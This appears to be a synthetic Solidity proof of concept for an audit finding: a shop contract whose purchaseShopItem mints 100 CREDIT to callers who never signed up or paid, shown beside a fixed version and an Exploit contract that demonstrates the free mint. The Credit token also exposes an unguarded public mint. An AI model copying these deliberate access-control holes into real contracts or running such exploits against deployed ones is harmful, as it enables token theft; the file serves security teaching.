// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Ruyui shop — purchaseShopItem does not require signup
    (Shieldify, Roots of Embervault, January 2026).
    SYNTHETIC, cheatcode-free, one block.
    The caller has not signed up and pays 0. purchaseShopItem still mints
    100 CREDIT and records the item. Control reverts until hasSignedUp is set. */

contract Credit {
    string public constant name = "CREDIT";
    string public constant symbol = "CREDIT";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
}

contract Shop {
    Credit public credit;
    mapping(address => bool) public hasSignedUp;
    mapping(address => mapping(uint256 => uint256)) public userShopItemPurchases;
    uint256 public constant CREDIT_OUT = 100 ether;

    constructor(Credit credit_) {
        credit = credit_;
    }

    function signUp() external {
        hasSignedUp[msg.sender] = true;
    }

    function purchaseShopItem(uint256 itemId) external {
        // @> VULN: the purchase does not require signup, so the caller is credited for 0
        userShopItemPurchases[msg.sender][itemId] += 1;
        credit.mint(msg.sender, CREDIT_OUT);
    }
}

contract ShopFixed {
    Credit public credit;
    mapping(address => bool) public hasSignedUp;
    mapping(address => mapping(uint256 => uint256)) public userShopItemPurchases;
    uint256 public constant CREDIT_OUT = 100 ether;

    constructor(Credit credit_) {
        credit = credit_;
    }

    function signUp() external {
        hasSignedUp[msg.sender] = true;
    }

    function purchaseShopItem(uint256 itemId) external {
        require(hasSignedUp[msg.sender], "signup");
        userShopItemPurchases[msg.sender][itemId] += 1;
        credit.mint(msg.sender, CREDIT_OUT);
    }
}

contract Exploit {
    Credit public credit;
    Shop public shop;
    uint256 public credited;
    uint256 public items;

    constructor() {
        credit = new Credit();
        shop = new Shop(credit);
    }

    function run() external {
        require(shop.hasSignedUp(address(this)) == false, "not signed up");
        shop.purchaseShopItem(1);
        credited = credit.balanceOf(address(this));
        items = shop.userShopItemPurchases(address(this), 1);
        require(credited == 100 ether, "credit");
        require(items == 1, "item");
        require(shop.hasSignedUp(address(this)) == false, "still unsigned");
    }
}
